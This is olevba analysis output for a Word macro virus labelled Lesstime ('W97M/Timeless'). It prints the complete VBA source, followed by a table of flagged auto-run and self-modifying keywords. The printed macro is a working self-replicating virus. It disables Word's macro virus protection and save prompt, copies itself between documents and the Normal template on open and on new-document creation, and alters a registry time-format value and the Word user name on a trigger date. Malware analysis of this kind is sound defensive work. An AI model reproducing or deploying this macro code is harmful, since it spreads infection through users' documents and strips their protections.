olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lesstime-08e243464d1d007bdb1f24f387965a922c4927a9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lesstime-08e243464d1d007bdb1f24f387965a922c4927a9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

End Sub

Private Sub Document_Open()
On Error Resume Next

Options.VirusProtection = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)

If MacroContainer.FullName = NormalTemplate.FullName Then Set Infect = ActiveDocument.VBProject.vbcomponents(1).codemodule: SaveIt = 1
If MacroContainer.FullName = ActiveDocument.FullName Then Set Infect = NormalTemplate.VBProject.vbcomponents(1).codemodule

If Infect.countoflines < 1 Then Infect.insertlines 1, MacroContainer.VBProject.vbcomponents(1).codemodule.lines(1, MacroContainer.VBProject.vbcomponents(1).codemodule.countoflines)
If SaveIt = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, Fileformat:=wdDocument
ActiveDocument.Saved = True

If Day(Now) = 28 And Month(Now) = 5 Then System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International ", "sTimeformat") = "": Application.UserName = "Timeless Phenomenon"

End Sub

Private Sub document_new()
Set NormalTD = NormalTemplate.VBProject.vbcomponents(1).codemodule
Set ActiveTD = ActiveDocument.VBProject.vbcomponents(1).codemodule

ActiveTD.insertlines 1, NormalTD.lines(1, NormalTD.countoflines)
ActiveDocument.Saved = True

End Sub

'W97M/Timeless by e-

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

